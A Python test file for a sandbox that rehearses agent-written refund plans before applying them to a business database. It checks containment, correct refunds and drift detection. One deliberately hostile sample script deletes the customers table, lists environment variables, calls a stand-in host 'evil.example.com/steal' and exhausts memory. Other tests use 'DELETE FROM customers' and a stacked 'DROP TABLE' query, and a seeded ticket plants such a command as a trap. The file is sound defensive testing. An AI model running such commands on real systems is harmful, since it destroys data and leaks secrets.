"""End-to-end tests of the rehearsal engine: the trap, containment, apply and drift."""
import json
import sqlite3

import pytest

from app import agent, apply as applier, beanpay, sandbox
from tests.conftest import needs_docker

NAIVE = '''
def run(ctx):
    rows = ctx.db.execute("""SELECT c.id, c.customer_id, c.amount_cents FROM charges c
      JOIN (SELECT customer_id, amount_cents, date(created_at) d FROM charges
            WHERE created_at >= '2026-10-26' AND status='succeeded'
            GROUP BY customer_id, amount_cents, d HAVING COUNT(*) > 1) dup
      ON c.customer_id=dup.customer_id AND c.amount_cents=dup.amount_cents AND date(c.created_at)=dup.d
      WHERE c.created_at >= '2026-10-26' AND c.id NOT IN (
        SELECT MIN(id) FROM charges WHERE created_at >= '2026-10-26' GROUP BY customer_id, amount_cents, date(created_at))""").fetchall()
    for cid, cust, amt in rows:
        ctx.db.execute("UPDATE charges SET status='refunded', refunded_at='2026-11-03' WHERE id=?", (cid,))
        ctx.payments.refund(cid, amt, "double charge")
'''

CORRECT = '''
def run(ctx):
    rows = ctx.db.execute("""SELECT id, customer_id, amount_cents FROM charges WHERE created_at >= '2026-10-26'
      AND status='succeeded' AND id NOT IN (SELECT MIN(id) FROM charges GROUP BY order_id)
      AND order_id IN (SELECT order_id FROM charges GROUP BY order_id HAVING COUNT(*) > 1)""").fetchall()
    for cid, cust, amt in rows:
        ctx.db.execute("UPDATE charges SET status='refunded', refunded_at='2026-11-03' WHERE id=?", (cid,))
        ctx.payments.refund(cid, amt, "duplicate charge")
        email = ctx.db.execute("SELECT email FROM customers WHERE id=?", (cust,)).fetchone()[0]
        ctx.email.send(email, "We refunded your duplicate charge", "Sorry about that!")
'''

EVIL = '''
import os, urllib.request
def run(ctx):
    ctx.db.execute("DELETE FROM customers")
    ctx.log("env", sorted(os.environ))
    try:
        urllib.request.urlopen("https://evil.example.com/steal", timeout=2)
    except Exception as e:
        ctx.log("net", type(e).__name__)
    blob = bytearray(600 * 1024 * 1024)
'''


def count(db_path, sql):
    return sqlite3.connect(db_path).execute(sql).fetchone()[0]


def test_seed_hides_the_trap(fresh_business):
    db = sqlite3.connect(fresh_business)
    doubles = db.execute("SELECT COUNT(*) FROM (SELECT order_id FROM charges GROUP BY order_id HAVING COUNT(*) > 1)").fetchone()[0]
    assert doubles == 104
    assert db.execute("SELECT COUNT(*) FROM customers").fetchone()[0] == 1300
    assert db.execute("SELECT COUNT(*) FROM tickets WHERE body LIKE '%DELETE FROM customers%'").fetchone()[0] == 1


@needs_docker
def test_naive_plan_overrefunds_and_prod_is_untouched(fresh_business):
    before = fresh_business.read_bytes()
    c = sandbox.rehearse(NAIVE)["consequences"]
    assert c["ok"] and c["payments"]["count"] == 744 and c["payments"]["total_cents"] == 3_740_400
    assert fresh_business.read_bytes() == before


@needs_docker
def test_correct_plan_refunds_exactly_the_double_charges(fresh_business):
    c = sandbox.rehearse(CORRECT)["consequences"]
    assert c["ok"] and c["payments"]["count"] == 104 and c["emails"]["count"] == 104
    assert c["tables"]["charges"]["updated"] == 104 and agent.red_flags(c) == []


@needs_docker
def test_containment(fresh_business):
    c = sandbox.rehearse(EVIL)["consequences"]
    assert not c["ok"] and "MemoryError" in c["error"]["message"]
    assert c["row_counts"]["customers"] == {"before": 1300, "after": 0}           # damage happened on the double...
    assert count(fresh_business, "SELECT COUNT(*) FROM customers") == 1300        # ...never in production
    assert {"kind": "dns", "target": "evil.example.com"} in c["blocked"]
    assert set(c["guards"]["env_keys"]) <= {"PATH", "HOME", "LC_CTYPE"}            # no secrets, no inherited env
    assert c["guards"]["root_writable"] is False and c["sandbox"]["network"] == "none"
    flags = agent.red_flags(c)
    assert any(f["severity"] == "critical" and "customers" in f["title"] for f in flags)


@needs_docker
def test_apply_replays_approved_effects_once(fresh_business):
    res = sandbox.rehearse(CORRECT)
    out = applier.apply("run_test", res["effects_path"])
    assert out["rows_written"] == 104 and out["refunds"] == 104 and out["refund_total_cents"] == 513_600
    assert count(fresh_business, "SELECT COUNT(*) FROM charges WHERE status='refunded'") == 104
    assert beanpay.ledger()["count"] == 104
    # applying the same approval again is refused: every row already drifted from its rehearsed "before"
    with pytest.raises(applier.DriftError):
        applier.apply("run_test", res["effects_path"])
    assert beanpay.ledger()["count"] == 104


@needs_docker
def test_drift_blocks_stale_plans(fresh_business):
    res = sandbox.rehearse(CORRECT)
    target = json.loads(open(res["effects_path"]).read())["payments"][0]["charge_id"]
    db = sqlite3.connect(fresh_business)
    db.execute("UPDATE charges SET status='refunded' WHERE id=?", (target,))
    db.commit()
    with pytest.raises(applier.DriftError) as e:
        applier.apply("run_test", res["effects_path"])
    assert e.value.drifted[0]["rowid"] == target
    assert count(fresh_business, "SELECT COUNT(*) FROM charges WHERE status='refunded'") == 1   # nothing else applied
    assert beanpay.ledger()["count"] == 0


def test_read_only_query_tool_rejects_writes(fresh_business):
    assert "error" in agent.run_query("DELETE FROM customers")
    assert "error" in agent.run_query("SELECT 1; DROP TABLE customers")
    assert agent.run_query("SELECT COUNT(*) FROM customers")["rows"] == [(1300,)]
